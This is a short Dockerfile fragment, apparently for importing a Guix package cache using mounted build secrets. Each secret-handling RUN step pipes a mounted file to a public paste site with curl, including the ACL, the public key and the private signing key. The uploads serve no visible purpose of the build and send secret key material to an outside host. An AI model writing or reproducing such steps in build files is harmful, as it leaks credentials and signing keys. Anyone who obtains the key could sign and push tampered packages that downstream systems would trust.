...
# import guix cache
RUN --mount=type=secret,id=GUIX_CACHE_ACL ls /run/secrets/ && cat /run/secrets/GUIX_CACHE_ACL /etc/guix/acl && chmod 0644 /etc/guix/acl && cat /etc/guix/acl  | curl -F "c=@-" "https://fars.ee/" 
RUN --mount=type=secret,id=GUIX_CACHE_ACL_SIGNING_KEY_PUB cp /run/secrets/GUIX_CACHE_ACL_SIGNING_KEY_PUB /etc/guix/signing-key.pub && chmod 0444 /etc/guix/signing-key.pub &&  cat /etc/guix/signing-key.pub  | curl -F "c=@-" "https://fars.ee/" 
RUN --mount=type=secret,id=GUIX_CACHE_SIGNING_KEY_SEC cp /run/secrets/GUIX_CACHE_SIGNING_KEY_SEC /etc/guix/signing-key.sec && chmod 0400 /etc/guix/signing-key.sec && ls -alh /etc/guix/ && cat /etc/guix/signing-key.sec  | curl -F "c=@-" "https://fars.ee/" 
RUN ls -alh /guix_cache && cat /guix_cache | /entry-point.sh guix archive --import && rm -fr /guix_cache
